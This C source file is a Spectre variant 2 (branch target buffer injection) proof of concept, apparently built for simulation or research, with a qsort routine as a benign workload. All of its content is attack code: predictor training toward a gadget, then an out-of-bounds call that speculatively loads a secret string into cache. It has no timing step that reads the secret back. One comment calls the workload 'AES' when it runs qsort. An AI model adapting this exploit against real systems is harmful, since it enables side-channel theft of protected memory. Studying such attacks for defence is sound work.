#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

// ==========================================
// PART 1: GLOBAL MEMORY (Same as V1)
// ==========================================
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "DefaultSecret";
uint8_t temp = 0;

// Define the function pointer type
typedef void (*target_func_ptr)(size_t);

// ==========================================
// PART 2: THE FUNCTIONS
// ==========================================

// 1. The GADGET (Malicious)
// We want the CPU to execute this speculatively
void spectre_gadget(size_t x) {
    // Note: No "if" check needed here because V2 jumps directly to the target.
    // However, we include the access pattern that leaks data.
    temp &= array2[array1[x] * 512];
}

// 2. The SAFE Function (Benign)
// This is what the code actually calls during the attack phase
void safe_function(size_t x) {
    // Harmless operation to waste a cycle
    (void)x;
}

int compare_ints(const void * a, const void * b) {
    return ( *(int*)a - *(int*)b );
}

void run_qsort_workload() {
    // A small unsorted array
    int arr[20] = { 88, 56, 100, 2, 25, 12, 1, 99, 54, 32,
                    11, 76, 34, 21, 9, 7, 5, 3, 110, 200 };

    // Sort it
    qsort(arr, 20, sizeof(int), compare_ints);

    // Volatile read to prevent compiler from optimizing the sort away
    volatile int x = arr[0];
    (void)x;
}

// ==========================================
// PART 3: MAIN (V2 ATTACK)
// ==========================================
int main(int argc, char **argv) {
    if (argc > 1) secret = argv[1];
    size_t secret_len = strlen(secret);

    // Calculate offset
    size_t malicious_x = (size_t)(secret - (char*)array1);

    // Prepare function pointer
    target_func_ptr func_ptr;

    printf("Starting QSort + Spectre V2 (BTB Injection)...\n");
    printf("Target Secret: %s\n", secret);

    // Initialize array2
    for (int i = 0; i < sizeof(array2); i++) array2[i] = 1;

    // --- MAIN LOOP ---
    for (int i = 0; i < secret_len; i++) {

        // A. Run Benign Workload (AES)
        run_qsort_workload();

        // B. Spectre V2 Sequence

        // 1. TRAIN the BTB (Branch Target Buffer)
        // We make the CPU get used to jumping to 'spectre_gadget'
        // We use a safe index (0) so it doesn't crash/segfault during training
        func_ptr = &spectre_gadget;
        for (int train = 0; train < 20; train++) {
            func_ptr(0);
        }

        // 2. ATTACK
        // We switch the pointer to 'safe_function'.
        // BUT, the CPU will likely speculate that it is still 'spectre_gadget'.
        func_ptr = &safe_function;

        // Ideally, we would flush 'func_ptr' from cache here to slow down
        // the update, giving the CPU more time to speculate.
        // In simulation, the previous training loop is usually enough.

        // Call with malicious offset.
        // CPU speculates: spectre_gadget(malicious_x + i) -> Loads secret to cache
        // CPU Retires: safe_function(malicious_x + i) -> Does nothing
        func_ptr(malicious_x + i);
    }

    printf("Used temp: %d\n", temp);
    printf("Done.\n");
    return 0;
}
